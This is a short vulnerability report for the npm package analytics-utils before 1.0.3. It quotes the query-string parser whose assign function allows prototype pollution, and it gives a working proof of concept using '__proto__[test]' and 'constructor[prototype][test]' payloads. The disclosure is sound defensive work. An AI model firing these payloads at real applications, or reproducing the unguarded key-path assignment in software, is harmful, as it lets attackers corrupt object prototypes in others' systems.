## analytics-utils < 1.0.3

URL: 

https://github.com/DavidWells/analytics/tree/master/packages/analytics-utils <br />
https://www.npmjs.com/package/analytics-utils

### Vulnerable code fragment

https://github.com/DavidWells/analytics/blob/641a9172130d2bb2e0bf524e649450bc34f90298/packages/analytics-utils/src/paramsParse.js#L31-L67

```js
function getParamsAsObject(query) {
  let params = {}
  let temp
  const re = /([^&=]+)=?([^&]*)/g

  while (temp = re.exec(query)) {
    var k = decodeUri(temp[1])
    var v = decodeUri(temp[2])
    if (k.substring(k.length - 2) === '[]') {
      k = k.substring(0, k.length - 2);
      (params[k] || (params[k] = [])).push(v)
    } else {
      params[k] = (v === '') ? true : v
    }
  }

  for (var prop in params) {
    var arr = prop.split('[')
    if (arr.length > 1) {
      assign(params, arr.map((x) => x.replace(/[?[\]\\ ]/g, '')), params[prop])
      delete params[prop]
    }
  }
  return params
}

function assign(obj, keyPath, value) {
  var lastKeyIndex = keyPath.length - 1
  for (var i = 0; i < lastKeyIndex; ++i) {
    var key = keyPath[i]
    if (!(key in obj)) { 
      obj[key] = {} 
    }
    obj = obj[key]
  }
  obj[keyPath[lastKeyIndex]] = value
}
```

### PoC

```
?__proto__[test]=test
?constructor[prototype][test]=test
```

```js
utils = require('analytics-utils')

utils.paramsParse('?__proto__[test]=test')
utils.paramsParse('?constructor[prototype][test]=test')
```